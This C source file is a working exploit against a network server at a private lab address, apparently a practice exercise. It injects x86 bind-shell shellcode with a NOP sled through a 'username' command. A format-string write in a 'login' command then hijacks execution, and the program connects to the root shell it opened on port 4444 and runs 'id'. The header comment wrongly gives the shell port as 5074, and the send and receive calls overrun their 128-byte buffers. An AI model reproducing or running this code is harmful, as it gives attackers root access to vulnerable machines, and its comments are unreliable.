//Just sent the buffer to the server through socket
//then the server will jump to the copy of our buffer(on heap) and get root privilege, and listen on port 5074
//so we use "nc serveraddress 5074" to connect to the server and type "id" ,so we get root.
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT 2994
void fatal(const char* err){
   printf("%s/n",err);
   exit(-1);
}

char shellcode[] = 
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" 
                "\x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a" 
                "\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0" 
                "\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f" 
                "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0" 
                "\x0b\xcd\x80";


int main()
{
   int sockfd;
   struct sockaddr_in target_addr;
   char result[128];
   char buffer[128];

   if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
         fatal("in socket");

   target_addr.sin_family = AF_INET;
   target_addr.sin_port = htons(PORT);
   target_addr.sin_addr.s_addr =inet_addr("192.168.209.158");
   memset(&(target_addr.sin_zero), '\0', 8); // Zero the rest of the struct.

   if (connect(sockfd, (struct sockaddr *)&target_addr, sizeof(struct sockaddr)) == -1)
      fatal("connecting to target server 1");
   
   char array[17];
   for(int i=0;i<16;++i)
      array[i]='\x90';
   array[16]=0;
   

   int length=sprintf(buffer,"username %s%s\n",array,shellcode);
   printf("%s",buffer);
   if(send(sockfd,buffer,length,0)==-1) //here we must use the real length instead of 128.
      fatal("send erro");

   memset(buffer,'\0',sizeof(buffer));
   char *addr = "\x94\xa1\x04\x08";
   char *len = "%41352d";
   char *wrt = "%44$hn";
   int reallength=sprintf(buffer,"login %s%s%s\n",addr,len,wrt);
   printf("%s",buffer);
   if(send(sockfd,buffer,reallength,0)==-1) //here we must use the real length instead of 128
      fatal("send erro");


   
   close(sockfd);



   if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
         fatal("in socket");

   target_addr.sin_family = AF_INET;
   target_addr.sin_port = htons(4444);
   target_addr.sin_addr.s_addr =inet_addr("192.168.209.158");
   memset(&(target_addr.sin_zero), '\0', 8); // Zero the rest of the struct.

   sleep(2); //wait the server to set up
   if (connect(sockfd, (struct sockaddr *)&target_addr, sizeof(struct sockaddr)) == -1)
      fatal("connecting to target server 2");

   memset(buffer,0,sizeof(buffer));

   sprintf(buffer,"id\n");
   if(send(sockfd,buffer,1024,0)==-1)
      fatal("send erro");

   if(recv(sockfd,result,1024,0)==-1)
      fatal("recv erro");

   printf("%s\n",result);

}
